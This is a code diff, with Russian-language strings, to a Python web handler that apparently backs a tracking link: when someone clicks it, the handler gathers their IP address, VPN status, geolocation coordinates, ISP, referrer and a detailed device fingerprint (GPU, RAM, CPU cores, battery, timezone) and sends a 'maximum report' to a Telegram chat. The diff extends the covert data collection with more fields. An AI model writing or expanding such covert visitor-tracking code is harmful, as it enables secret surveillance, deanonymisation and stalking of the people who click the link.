@@ -110,6 +110,7 @@ def collect():
 
   visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
   user_agent = request.headers.get("User-Agent", "Не определен")
+  referer = request.referrer or "Прямой переход"
 
   geo_info = {}
   try:
@@ -131,30 +132,32 @@ def collect():
   lon = geo_info.get("lon", "Н/Д")
   is_vpn = "Да" if geo_info.get("proxy") else "Нет / Неизвестно"
 
-  # Формируем одно мощное и развернутое сообщение для Telegram
   message_text = (
-      f"🔔 *НОВЫЙ ПЕРЕХОД ПО ССЫЛКЕ*\n\n"
+      f"🔔 *МАКСИМАЛЬНЫЙ ОТЧЕТ О ПЕРЕХОДЕ*\n\n"
       f"⏱ *Время:* `{visit_time}`\n"
       f"🌐 *IP-адрес:* `{ip}`\n"
-      f"🛡 *VPN / Прокси:* `{is_vpn}`\n\n"
+      f"🛡 *VPN / Прокси:* `{is_vpn}`\n"
+      f"🔗 *Реферер:* `{referer}`\n\n"
       f"*📍 ГЕОЛОКАЦИЯ:*\n"
       f"• Страна: `{country}`\n"
       f"• Регион: `{region}`\n"
       f"• Город: `{city}`\n"
       f"• Координаты: `{lat}, {lon}`\n"
-      f"• Провайдер: `{isp}`\n\n"
-      f"*💻 УСТРОЙСТВО И ЭКРАН:*\n"
+      f"• Провайдер: `{isp}`\n"
+      f"• Организация: `{org}`\n\n"
+      f"*💻 ЖЕЛЕЗО И ЭКРАН:*\n"
       f"• Платформа ОС: `{client_data.get('platform', 'Н/Д')}`\n"
-      f"• Экран: `{client_data.get('screenResolution', 'Н/Д')}`\n"
+      f"• Экран: `{client_data.get('screenResolution', 'Н/Д')}` (Доступно: `{client_data.get('availResolution', 'Н/Д')}`)\n"
       f"• Плотность пикселей: `{client_data.get('pixelRatio', 'Н/Д')}`\n"
       f"• Точки касания (Тач): `{client_data.get('maxTouchPoints', '0')}`\n"
-      f"• Процессор (Ядра): `{client_data.get('hardwareConcurrency', 'Н/Д')}`\n"
+      f"• Ядра процессора: `{client_data.get('hardwareConcurrency', 'Н/Д')}`\n"
       f"• Оперативная память: `{client_data.get('deviceMemory', 'Н/Д')}`\n"
-      f"• Видеокарта: `{client_data.get('gpuRenderer', 'Н/Д')}`\n\n"
-      f"*⚙ НАСТРОЙКИ СИСТЕМЫ:*\n"
+      f"• Видеокарта (GPU): `{client_data.get('gpuRenderer', 'Н/Д')}`\n\n"
+      f"*⚙ СИСТЕМА И БАТАРЕЯ:*\n"
       f"• Язык: `{client_data.get('language', 'Н/Д')}`\n"
       f"• Часовой пояс: `{client_data.get('timezone', 'Н/Д')}`\n"
-      f"• Батарея: `{client_data.get('batteryLevel', 'Н/Д')} (Зарядка: {client_data.get('batteryCharging', 'Н/Д')})`\n\n"
+      f"• Батарея: `{client_data.get('batteryLevel', 'Н/Д')} (Зарядка: {client_data.get('batteryCharging', 'Н/Д')})`\n"
+      f"• Cookies: `{client_data.get('cookiesEnabled', 'Н/Д')}` | Онлайн: `{client_data.get('onLine', 'Н/Д')}`\n\n"
       f"*🌐 USER-AGENT:*\n`{user_agent}`"
   )
 
